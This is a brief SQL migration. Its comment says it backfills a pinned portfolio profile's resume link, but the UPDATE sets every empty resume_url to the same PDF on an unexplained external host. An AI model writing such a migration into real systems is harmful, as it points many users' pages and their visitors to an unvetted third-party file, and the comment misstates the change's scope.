-- Backfill the pinned portfolio profile with the default resume URL so the
-- resume link shows without requiring a template re-save.

UPDATE portfolio_profiles SET resume_url = 'http://f.przknv.cc/u/XghaIR.pdf' WHERE resume_url = '';
